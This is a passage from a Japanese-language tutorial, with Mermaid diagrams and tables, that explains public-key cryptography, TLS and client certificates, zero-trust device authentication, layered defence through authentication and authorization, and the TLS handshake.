        Pri["🔐 秘密鍵絶対に外に出さない"]
    end

    Encrypt["暗号化：公開鍵で施錠→ 秘密鍵を持つ人しか開けられない"]
    Sign["署名：秘密鍵で署名→ 公開鍵で「本物か」確認できる"]

    Pub --> Encrypt
    Pri --> Sign
```

証明書とは「**この公開鍵は確かに本物です**」と第三者機関（CA）が保証した文書です。

---



### 6.1 TLS/SSL証明書（HTTPS通信の基盤）

#### 何のためにある？

ブラウザが「今通信している相手は本物のサーバーか」を確認するための仕組みです。これがないと、偽サイトへの誘導（中間者攻撃）を検知できません。

```mermaid
sequenceDiagram
    actor User as 👤 ブラウザ
    participant Server as Webサーバー
    participant CA as 認証局（CA）例：Let's Encrypt

    Note over Server,CA: 事前準備（証明書の取得）
    Server->>CA: 「example.comの証明書をください」
    CA->>CA: ドメイン所有者であることを確認
    CA->>Server: TLS証明書を発行（CAの署名付き）

    Note over User,Server: 実際の通信時
    User->>Server: ① HTTPSでアクセス
    Server->>User: ② TLS証明書を提示
    User->>CA: ③ 「この証明書は本物？」と確認
    CA->>User: ④ 「本物です（CAが署名済み）」
    User->>Server: ⑤ 暗号化通信を開始 🔒
```

#### 証明書の種類

| 種類 | 検証レベル | 取得難易度 | 向いている用途 |
|------|----------|----------|--------------|
| **DV（ドメイン認証）** | ドメイン所有のみ確認 | 簡単・無料（Let's Encrypt）| 個人サイト・開発環境 |
| **OV（組織認証）** | 組織の実在を確認 | 中程度 | 企業サイト・業務システム |
| **EV（拡張認証）** | 組織を厳格に審査 | 高い・有償 | 金融・ECなど信頼性が重要なサービス |

#### 有効期限と失効の注意点

```mermaid
flowchart LR
    Issue["証明書発行"]
    Valid["✅ 有効期間（最大398日）"]
    Expire["❌ 期限切れブラウザが警告表示"]
    Revoke["❌ 失効（CRL/OCSP）秘密鍵漏洩時など緊急無効化"]
    Renew["🔄 更新"]

    Issue --> Valid --> Expire --> Renew --> Valid
    Valid --> Revoke
```

> 証明書の期限切れはサービス停止に直結します。Let's Encryptのような自動更新（ACME）の仕組みを使うか、期限監視を必ず設定しましょう。

---



### 6.2 クライアント証明書（デバイス・ユーザー認証）

#### 何のためにある？

TLS証明書が「サーバーの身元証明」であるのに対し、クライアント証明書は **「接続してきた端末・ユーザーの身元証明」** です。パスワードを使わずに、デバイス自体を認証できます。

```mermaid
sequenceDiagram
    actor User as 👤 ユーザー（端末）
    participant Server as 社内システム
    participant IdP as 社内IdP / MDM

    Note over User,IdP: 事前準備（証明書のインストール）
    IdP->>User: クライアント証明書を発行・端末にインストール

    Note over User,Server: アクセス時
    User->>Server: ① アクセス要求
    Server->>User: ② 「クライアント証明書を提示してください」
    User->>Server: ③ 端末の証明書を提示
    Server->>Server: ④ 証明書を検証（有効期限・失効・発行元）
    Server->>User: ⑤ 認証OK → アクセス許可 ✅
```

#### パスワード認証との比較

| | **パスワード認証** | **クライアント証明書認証** |
|---|---|---|
| **盗難リスク** | フィッシングで盗まれる | 端末から取り出せないため盗難困難 |
| **フィッシング耐性** | 低い | 高い（証明書はドメインに紐づく） |
| **管理コスト** | 低い | 高い（証明書の発行・失効管理が必要） |
| **ユーザー体験** | パスワード入力が必要 | 透過的（意識せずに認証される） |
| **向いている場面** | 一般ユーザー向けサービス | 社内システム・ゼロトラスト環境 |

#### ゼロトラストにおける役割

```mermaid
flowchart LR
    Device["💻 端末"]

    subgraph ZeroTrust["ゼロトラスト検証"]
        C1{"クライアント証明書あり？"}
        C2{"証明書は有効期限内？"}
        C3{"MDM管理済みデバイス？"}
    end

    Allow["✅ アクセス許可"]
    Deny["❌ アクセス拒否"]

    Device --> C1
    C1 -->|"YES"| C2
    C2 -->|"YES"| C3
    C3 -->|"YES"| Allow
    C1 & C2 & C3 -->|"NO"| Deny

    style Allow fill:#d4edda,stroke:#28a745,color:#000
    style Deny fill:#f8d7da,stroke:#dc3545,color:#000
```

---



### まとめ：2つの証明書の役割の違い

| | **TLS/SSL証明書** | **クライアント証明書** |
|---|---|---|
| **誰の証明？** | サーバー | 端末・ユーザー |
| **誰が検証？** | ブラウザ | サーバー |
| **主な目的** | 通信の暗号化・サーバー正当性確認 | デバイス認証・不正端末の排除 |
| **失効時の影響** | ブラウザ警告・サービス停止 | その端末のアクセスが即遮断 |



### 6.3 多層防御の仕組み

#### 全体像：1回のアクセスで何が起きているか

```mermaid
sequenceDiagram
    actor User as 👤 ユーザー
    participant Browser as ブラウザ
    participant TLS as TLS証明書の検証
    participant AuthN as 認証（Authentication）
    participant AuthZ as 認可（Authorization）
    participant Resource as 🗂️ リソース

    Note over Browser,TLS: ① まず「通信相手は本物か」を確認
    Browser->>TLS: サーバー証明書を検証
    TLS-->>Browser: ✅ 本物のサーバーと確認・暗号化通信を確立

    Note over Browser,AuthN: ② 次に「あなたは誰か」を確認
    Browser->>AuthN: ログイン情報 or クライアント証明書を提示
    AuthN-->>Browser: ✅ 本人確認OK → JWTトークン発行

    Note over Browser,AuthZ: ③ 最後に「何をしてよいか」を確認
    Browser->>AuthZ: JWTトークン付きでリクエスト
    AuthZ-->>Browser: ✅ 権限あり → アクセス許可
    AuthZ->>Resource: データを返す
```

> 証明書・認証・認可は**順番に積み重なる関門**です。どれか一つが欠けても安全な通信は成立しません。

---

### 6.4 クライアント証明書は認証を兼ねる

ここが混乱しやすいポイントです。TLS証明書は常に「通信路の保護」ですが、クライアント証明書は**認証のステップを担う**こともできます。

```mermaid
flowchart TD
    subgraph Pattern1["パターン①：一般的なWebアプリ"]
        direction LR
        P1_TLS["TLS証明書通信を暗号化"]
        P1_PW["パスワード＋MFA認証"]
        P1_JWT["JWTトークン認可"]
        P1_TLS --> P1_PW --> P1_JWT
    end

    subgraph Pattern2["パターン②：ゼロトラスト・社内システム"]
        direction LR
        P2_TLS["TLS証明書通信を暗号化"]
        P2_CERT["クライアント証明書認証（パスワード不要）"]
        P2_JWT["JWTトークン認可"]
        P2_TLS --> P2_CERT --> P2_JWT
    end

    style Pattern1 fill:#fff3cd,stroke:#ffc107
    style Pattern2 fill:#d4edda,stroke:#28a745
```

---



### 6.5 整理：3つの要素が「何を守っているか」

| | **TLS/SSL証明書** | **認証** | **認可** |
|---|---|---|---|
| **問い** | 通信相手は本物か？ | あなたは誰か？ | 何をしてよいか？ |
| **守るもの** | 通信路（盗聴・改ざん・なりすまし）| IDの正当性 | リソースへの不正アクセス |
| **使う技術** | TLS証明書（CA発行）| パスワード・MFA・クライアント証明書 | RBAC・ABAC・JWT |
| **突破されると** | 通信内容が盗まれる・偽サイトに誘導される | 不正ログインされる | 権限外のデータにアクセスされる |
| **いつ動くか** | 通信確立時（常時）| ログイン時 | APIリクエストのたびに |

---



### まとめ：3つは「独立した関門」ではなく「積み重なる防御」

```mermaid
flowchart LR
    Internet["🌐 インターネット"]

    G1["🔒 関門①TLS証明書通信路を保護"]
    G2["🪪 関門②認証本人確認"]
    G3["🔑 関門③認可権限確認"]
    Resource["🗂️ リソース"]

    Deny1["❌ 偽サイト・盗聴を遮断"]
    Deny2["❌ 不正ログインを遮断"]
    Deny3["❌ 権限外アクセスを遮断"]

    Internet --> G1 --> G2 --> G3 --> Resource
    G1 --> Deny1
    G2 --> Deny2
    G3 --> Deny3

    style Deny1 fill:#f8d7da,stroke:#dc3545,color:#000
    style Deny2 fill:#f8d7da,stroke:#dc3545,color:#000
    style Deny3 fill:#f8d7da,stroke:#dc3545,color:#000
    style Resource fill:#d4edda,stroke:#28a745,color:#000
```


---

<br>
<br>

## 7. ハンドシェイクとは

「ハンドシェイク（握手）」とは、**実際のデータ通信を始める前に、双方が「安全に話せる状態か」を確認し合う準備手続き** のことです。

人間に例えると、電話をかけたときに「もしもし、聞こえますか？」「聞こえます、どうぞ」とやり取りしてから本題に入るのと同じです。

---

### 7.1 TLSハンドシェイクの流れ

```mermaid
sequenceDiagram
    actor Client as 👤 ブラウザ（Client）
    participant Server as 🖥️ Webサーバー（Server）

    Note over Client,Server: ① 挨拶：お互いの能力を伝え合う
    Client->>Server: 「TLS1.3使えます。暗号化方式はAES/ChaCha20など対応しています」
    Server->>Client: 「了解。TLS1.3・AESを使いましょう」

    Note over Client,Server: ② サーバーの身元確認
    Server->>Client: TLS証明書を提示「私はexample.comです（CA署名付き）」
    Client->>Client: CAの署名を検証✅ 本物のサーバーと確認

    Note over Client,Server: ③ 暗号化の鍵を作る
    Client->>Server: 鍵生成に必要な情報を交換
    Server->>Client: 鍵生成に必要な情報を交換
    Client->>Client: 共通の暗号化鍵を生成
    Server->>Server: 共通の暗号化鍵を生成

    Note over Client,Server: ④ 暗号化通信の開始
    Client->>Server: 「準備完了です🔒」
    Server->>Client: 「準備完了です🔒」
    Client->>Server: 暗号化されたHTTPリクエスト
    Server->>Client: 暗号化されたHTTPレスポンス
```

---



### 7.2 認証・認可との関係における位置づけ

```mermaid
flowchart LR
    H["🤝 ハンドシェイク通信路を安全に確立"]
    T["🔒 TLS暗号化通信盗聴・改ざんを防ぐ"]
    A["🪪 認証本人確認"]
    Z["🔑 認可権限確認"]

    H -->|"安全な通信路の上で"| T
    T -->|"安全な通信路の上で"| A
    A -->|"確認済みの上で"| Z

    style H fill:#d1ecf1,stroke:#17a2b8,color:#000
```

ハンドシェイクは認証・認可よりも**さらに手前の「土台」**にあたります。この土台があって初めて、認証情報（パスワードやトークン）を安全にやり取りできます。逆に言えば、**ハンドシェイクが成立しない＝そもそも安全に通信できない**状態です。

---



### まとめ

| | **内容** | **もし省略すると** |
|---|---|---|
| **ハンドシェイク** | 通信相手の確認・暗号化方式の合意・鍵の共有 | 偽サーバーと通信・通信内容が丸見え |
| **TLS暗号化** | ハンドシェイクで決めた鍵で通信を暗号化 | パスワードや個人情報が盗まれる |
| **認証** | 誰がアクセスしているか確認 | 不正ログインが成立する |
| **認可** | 何をしてよいか確認 | 権限外のデータにアクセスされる |